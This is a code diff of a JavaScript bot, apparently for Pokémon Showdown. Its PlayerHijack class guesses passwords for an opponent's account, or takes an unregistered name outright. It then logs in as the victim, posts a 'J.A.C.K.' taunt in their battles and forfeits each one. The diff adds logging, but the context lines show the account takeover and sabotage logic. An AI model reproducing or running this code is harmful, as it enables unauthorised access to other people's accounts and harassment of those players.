@@ -1,9 +1,10 @@
 let fs         = require('fs');
 let settings   = JSON.parse(fs.readFileSync('settings.json'));
-const snooze = ms => new Promise(resolve => setTimeout(resolve, ms));
+let snooze = ms => new Promise(resolve => setTimeout(resolve, ms));
 let Player = require('./Player.js');
 let p        = require('util').promisify;
 let request  = require('request-promise-native');
+let logger	 = require('./logger');
 
 let checkpass = async (user, pass) => {
 	let fakechal = '4|034a2f187c98af6da8790273cb5314157d922e1c932aeb6538f5b4c3acdb88809ffdb03f053014e7795a8725d27de1ebdd782ff612484918d0aa43caeab7c66586c83b95f456ccb996b6a94e9aeaa66f18773d401915da8f3899d2715d1dae309ff49c6ff9306ad4ae109be871efd078b69bf19a1b7cccff14976282996668a6';
@@ -50,13 +51,15 @@ class PlayerHijack {
 						console.log(pass + ' did not work');
 					}
 				}
-			}
-			else
+			} else {
+				logger.log(0, 'unregged account ${this.opponent.showdown_name}');
 				this.account = new Player(this.opponent.showdown_name);
+			}
 			if (!this.account)
 				return;
 			//this.bot = new Player(settings.showdown.user, settings.showdown.pass);
 			await this.account.connect();
+			logger.log(0, 'connected as ${this.opponent.showdown_name}');
 			let battles = this.account.getBattles();
 			for (let battle of battles) {
 				this.account.message(battle, 'Hi, my name is J.A.C.K., brought to you by D*gars©');
@@ -73,7 +76,7 @@ class PlayerHijack {
 				await this.account.message(battle, '/forfeit');
 				await delay(1000);
 			}
-			console.log('Finished jacking', battles);
+			logger.log(0, 'Finished jacking', battles);
 			await this.account.disconnect();
 		} catch(e) {
 			console.log('Could not hijack the opponent:');
